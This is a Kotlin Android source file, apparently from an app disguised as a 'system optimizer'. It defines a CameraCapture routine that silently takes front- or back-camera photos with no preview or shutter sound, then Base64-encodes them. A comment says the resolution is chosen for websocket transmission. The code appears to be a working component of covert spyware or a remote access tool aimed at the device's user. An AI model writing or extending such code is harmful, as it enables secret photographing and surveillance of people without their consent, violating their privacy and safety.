package com.system.optimizer.monitor

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat

/**
 * Silently captures a JPEG photo using the Front or Back camera via Camera2 API
 * without opening a camera preview or triggering shutter sounds.
 */
object CameraCapture {

    private const val TAG = "CameraCapture"

    @SuppressLint("MissingPermission")
    fun takePhoto(context: Context, cameraType: String = "front", callback: (String?) -> Unit) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "❌ CAMERA permission not granted")
            callback(null)
            return
        }

        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val handler = Handler(Looper.getMainLooper())
        var cameraClosed = false

        // Timeout fallback after 6 seconds to prevent leaking resources
        val timeoutRunnable = Runnable {
            if (!cameraClosed) {
                cameraClosed = true
                Log.e(TAG, "⏱️ Camera capture timed out after 6 seconds")
                callback(null)
            }
        }
        handler.postDelayed(timeoutRunnable, 6000)

        try {
            val targetFacing = if (cameraType.equals("back", ignoreCase = true)) {
                CameraCharacteristics.LENS_FACING_BACK
            } else {
                CameraCharacteristics.LENS_FACING_FRONT
            }

            var targetCameraId: String? = null
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == targetFacing) {
                    targetCameraId = id
                    break
                }
            }

            // Fallback to first available camera if desired facing not found
            if (targetCameraId == null && cameraManager.cameraIdList.isNotEmpty()) {
                targetCameraId = cameraManager.cameraIdList[0]
            }

            if (targetCameraId == null) {
                Log.e(TAG, "No camera found on device")
                handler.removeCallbacks(timeoutRunnable)
                callback(null)
                return
            }

            Log.i(TAG, "📷 Opening camera ID $targetCameraId ($cameraType)")

            val chars = cameraManager.getCameraCharacteristics(targetCameraId)
            val sensorOrientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0

            // Choose resolution up to ~1280x720 for fast websocket transmission
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG) ?: arrayOf()
            var width = 640
            var height = 480
            for (size in sizes) {
                if (size.width in 640..1280 && size.height in 480..960) {
                    width = size.width
                    height = size.height
                    break
                }
            }

            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)

            var openedCamera: CameraDevice? = null
            var activeSession: CameraCaptureSession? = null

            fun cleanup() {
                if (!cameraClosed) {
                    cameraClosed = true
                    handler.removeCallbacks(timeoutRunnable)
                }
                try {
                    activeSession?.close()
                } catch (_: Exception) {}
                try {
                    openedCamera?.close()
                } catch (_: Exception) {}
                try {
                    imageReader.close()
                } catch (_: Exception) {}
            }

            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()

                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        Log.i(TAG, "✅ Camera photo captured (${bytes.size} bytes)")
                        cleanup()
                        if (cameraClosed) {
                            // Only return if not already timed out
                            callback(base64)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing image bytes: ${e.message}", e)
                    cleanup()
                    callback(null)
                }
            }, handler)

            cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    openedCamera = camera
                    try {
                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                activeSession = session
                                try {
                                    val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    builder.addTarget(imageReader.surface)
                                    builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                    builder.set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)

                                    session.capture(builder.build(), null, handler)
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error starting capture: ${e.message}")
                                    cleanup()
                                    callback(null)
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "Camera session configuration failed")
                                cleanup()
                                callback(null)
                            }
                        }, handler)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error creating capture session: ${e.message}")
                        cleanup()
                        callback(null)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "Camera disconnected")
                    cleanup()
                    callback(null)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera error: $error")
                    cleanup()
                    callback(null)
                }
            }, handler)

        } catch (e: Exception) {
            Log.e(TAG, "Exception in takePhoto: ${e.message}", e)
            handler.removeCallbacks(timeoutRunnable)
            callback(null)
        }
    }
}
